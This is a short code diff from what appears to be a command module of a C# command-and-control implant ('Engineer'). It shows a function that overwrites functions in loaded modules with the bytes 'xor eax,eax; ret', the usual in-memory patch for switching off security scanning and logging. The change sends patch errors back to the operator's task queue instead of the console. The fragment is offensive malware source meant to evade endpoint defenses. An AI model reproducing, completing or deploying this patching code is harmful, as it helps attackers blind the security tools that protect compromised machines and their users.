@@ -22,12 +22,12 @@ namespace Engineer.Commands
                 if (IntPtr.Size == 8)
                 {
                     byte[] patch = { 0x33, 0xC0, 0xC3 };
-                    Patch(patch);
+                    Patch(patch,task);
                 }
                 else
                 {
                     byte[] patch = { 0x33, 0xC0, 0xC3 };
-                    Patch(patch);
+                    Patch(patch,task);
                 }
 
 
@@ -41,7 +41,7 @@ namespace Engineer.Commands
             }
         }
 
-        private static void Patch(byte[] patch)
+        private static void Patch(byte[] patch, EngineerTask task)
         {
             List<string> Modulelist = new List<string>() 
             {
@@ -75,8 +75,8 @@ namespace Engineer.Commands
                 catch (Exception e)
                 {
 
-                    Console.WriteLine(e.Message);
-                    Console.WriteLine($"module was {module}");
+                    //Console.WriteLine(e.Message);
+                    Tasking.FillTaskResults(e.Message,task,EngTaskStatus.Failed,TaskResponseType.String);
                 }
                
             }
